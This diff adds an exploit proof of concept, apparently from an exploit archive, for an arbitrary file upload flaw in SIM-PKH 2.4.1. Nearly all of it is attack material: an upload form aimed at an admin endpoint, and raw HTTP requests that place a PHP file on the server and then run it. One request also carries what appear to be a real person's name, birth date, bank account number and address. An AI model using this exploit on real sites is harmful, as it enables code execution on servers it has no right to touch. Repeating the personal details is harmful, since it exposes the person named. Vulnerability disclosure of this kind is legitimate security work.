@@ -1,0 +1,173 @@
+# Exploit Title: SIM-PKH 2.4.1 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-10-22
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://simpkh.sourceforge.io/
+# Software Link: https://sourceforge.net/projects/simpkh/files/latest/download
+# Version: 2.4.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 2)
+# Everyone....
+
+<form method="POST" enctype="multipart/form-data" action="http://localhost/[PATH]/admin/modul/mod_pengurus/aksi_pengurus.php?module=pengurus&act=update">
+<input name="fupload" type="file"> 
+<input value="Upload" type="submit"></td></tr>
+</form>
+
+# Upload Path: http://localhost/[PATH]/foto/59phpinfo2.php
+
+POST /[PATH]/admin/modul/mod_pengurus/aksi_pengurus.php?module=pengurus&act=update HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=sbl43od8c5ceereifi8qidm923
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------10453613844351558052030056362
+Content-Length: 261
+-----------------------------10453613844351558052030056362
+Content-Disposition: form-data; name="fupload"; filename="phpinfo2.php"
+Content-Type: application/force-download
+<?php
+phpinfo();
+?>
+-----------------------------10453613844351558052030056362--
+HTTP/1.1 200 OK
+Date: Mon, 22 Oct 2018 15:59:01 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 5554
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+# http://localhost/[PATH]/foto/59phpinfo2.php
+
+GET /sim-pkh/foto/59phpinfo2.php HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=sbl43od8c5ceereifi8qidm923
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Mon, 22 Oct 2018 15:59:28 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# Users....
+# http://localhost/[PATH]/admin/modul/mod_pengurus/aksi_pengurus.php?module=pengurus&act=update
+ 
+# Upload Path: http://localhost/[PATH]/foto/25phpinfo.php
+
+POST /[PATH]/admin/modul/mod_pengurus/aksi_pengurus.php?module=pengurus&act=update HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: [PATH]/admin/media.php?module=pengurus&act=editpengurus&id=320323241474
+Cookie: PHPSESSID=sbl43od8c5ceereifi8qidm923
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------84876618815601613714142368
+Content-Length: 2745
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="id_pengurus"
+320323241474
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="no_rekening"
+0401741906
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="nama"
+IMAS
+
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="tempat"
+SUKABUMI
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="tl"
+1985-11-08
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="Usia"
+33
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="fupload"; filename="phpinfo.php"
+Content-Type: application/force-download
+<?php
+phpinfo();
+?>
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="pekerjaan"
+BURUH
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="ibu_kandung"
+ELIS
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="suami"
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="alamat"
+KP BABAKAN RT 09 RW 02     
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="no_hp"
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="id_desa"
+4
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="id_kelompok"
+13
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="id_jabatan"
+2
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="id_status"
+1
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="id_pendamping"
+pdp-01
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="bumil"
+0
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="balita"
+1
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="apras"
+1
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="sd"
+0
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="smp"
+2
+-----------------------------84876618815601613714142368
+Content-Disposition: form-data; name="sma"
+0
+-----------------------------84876618815601613714142368--
+HTTP/1.1 302 Found
+Date: Mon, 22 Oct 2018 15:42:39 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: ../../media.php?module=pengurus
+Content-Length: 1976
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
